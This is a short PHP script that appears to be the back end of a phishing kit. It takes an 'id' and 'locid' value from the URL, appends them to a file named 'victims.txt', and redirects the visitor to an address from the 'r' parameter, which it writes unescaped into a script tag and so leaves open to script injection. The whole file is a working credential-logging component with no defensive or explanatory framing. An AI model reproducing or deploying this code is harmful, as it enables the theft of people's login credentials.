<?php
$u = $_GET['id'];
$p = $_GET['locid'];
if ($u && $p){
	$f = fopen('victims.txt','a+');
    fwrite($f,$u.'<!:!>'.$p."\n");
    fclose($f);
    echo "<script>window.location = '".$_GET['r']."'</script>";
}
?>